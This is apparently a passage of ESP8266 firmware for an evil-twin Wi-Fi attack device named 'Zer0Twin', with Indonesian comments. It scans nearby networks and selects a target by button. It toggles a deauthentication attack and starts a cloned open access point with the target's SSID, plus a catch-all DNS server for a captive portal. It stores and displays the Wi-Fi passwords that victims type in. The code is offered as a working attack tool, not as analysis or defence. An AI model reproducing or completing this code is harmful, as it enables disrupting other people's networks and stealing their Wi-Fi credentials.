typedef struct {
  String  ssid;
  uint8_t ch;
  uint8_t bssid[6];
  uint8_t rssi;
} _Network;

const byte DNS_PORT = 53;
IPAddress  apIP(192, 168, 4, 1);
DNSServer  dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

bool hotspot_active  = false;
bool deauthing_active = false;

String _correct     = "";
String _tryPassword = "";
String lastEvent    = "boot";

unsigned long now = 0, wifinow = 0, deauth_now = 0, oled_now = 0;
unsigned long sentFrames = 0;

int  btnRaw = 0, btnLastVal = 0, btnCand = -1, btnCandCnt = 0;
const char* btnLast = "-";

// ---------------- util -------------------------------------------------------
String bytesToStr(const uint8_t* b, uint32_t size){
  String str;
  for(uint32_t i = 0; i < size; i++){
    if(b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if(i < size - 1) str += ':';
  }
  return str;
}

void clearArray(){
  for(int i = 0; i < 16; i++) _networks[i] = _Network();
}

void performScan(){
  int n = WiFi.scanNetworks();
  clearArray();
  if(n > 0){
    for(int i = 0; i < n && i < 16; i++){
      _Network net;
      net.ssid = WiFi.SSID(i);
      net.rssi = WiFi.RSSI(i);
      net.ch   = WiFi.channel(i);
      const uint8_t* b = WiFi.BSSID(i);
      if(b) memcpy(net.bssid, b, 6);
      _networks[i] = net;
    }
  }
  WiFi.scanDelete();
}

// ---------------- OLED status (non-blocking) --------------------------------
void oledStatus(const String& ev){
  if(ev.length()) lastEvent = ev;
  display.clearDisplay();
  display.setFont();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(0, 0);  display.print("Zer0Twin  "); display.print(millis()/1000); display.println("s");
  display.setCursor(0, 8);  display.print("AP : "); display.println(AP_SSID);
  display.setCursor(0, 16); display.print("Tgt: "); display.println(_selectedNetwork.ssid.length() ? _selectedNetwork.ssid : String("-"));
  display.setCursor(0, 24); display.print("D:"); display.print(deauthing_active ? "ON " : "off");
  display.print("  T:"); display.println(hotspot_active ? "ON" : "off");
  display.setCursor(0, 32); display.print("Pkt: "); display.println(sentFrames);
  display.setCursor(0, 40); display.print("Pass: "); display.println(_tryPassword.length() ? _tryPassword : String("-"));
  display.setCursor(0, 48); display.print("Btn: "); display.print(btnLast); display.print(" raw="); display.println(btnRaw);
  display.setCursor(0, 56); display.println(ev);
  display.display();
}

// ---------------- tombol fisik ----------------------------------------------
int readButton(){
#if BTN_ADC
  int v = analogRead(BTN_PIN);
  btnRaw = v;
  if(v > 1000) return 0;
  if(v > 750)  return 1;
  if(v > 550)  return 2;
  if(v > 350)  return 3;
  if(v > 150)  return 4;
  return 5;
#else
  int v = digitalRead(BTN_PIN);
  btnRaw = v;
  return v == LOW ? 1 : 0;
#endif
}

void startHotspot(){
  if(_selectedNetwork.ssid.length() == 0) return;
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP(_selectedNetwork.ssid.c_str());
  dnsServer.start(53, "*", IPAddress(192,168,4,1));
  hotspot_active = true;
  oledStatus("twin ON: " + _selectedNetwork.ssid);
}

void stopHotspot(){
  hotspot_active = false;
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP(AP_SSID, AP_PASS);
  dnsServer.start(53, "*", IPAddress(192,168,4,1));
  oledStatus("twin off");
}

void stopAll(){
  deauthing_active = false;
  if(hotspot_active) stopHotspot();
  oledStatus("semua stop");
}

void handleButtons(){
#if BTN_ENABLED
  int b = readButton();
  if(b != btnCand){ btnCand = b; btnCandCnt = 0; return; }
  if(btnCandCnt < 5){ btnCandCnt++; return; }     // wajib stabil ~25 ms
  if(b == 0){ btnLastVal = 0; return; }
  if(b == btnLastVal) return;
  btnLastVal = b;

  if(b == 1){
    btnLast = "UP";
    for(int i = 0; i < 15; i++){
      if(_networks[(i+1) % 16].ssid.length() && _networks[i].ssid == _selectedNetwork.ssid){
        _selectedNetwork = _networks[(i+1) % 16]; break;
      }
    }
    if(_selectedNetwork.ssid.length() == 0 && _networks[0].ssid.length()) _selectedNetwork = _networks[0];
    oledStatus("target: " + _selectedNetwork.ssid);
  } else if(b == 2){
    btnLast = "DOWN";
    performScan();
    oledStatus("scan ulang");
  } else if(b == 3){
    btnLast = "OK";
    deauthing_active = !deauthing_active;
    oledStatus(deauthing_active ? "deauth ON" : "deauth off");
  } else if(b == 4){
    btnLast = "BACK";
    hotspot_active ? stopHotspot() : startHotspot();
  } else {
    btnLast = "EXTRA";
    stopAll();
  }
  oled_now = 0;
#endif
}

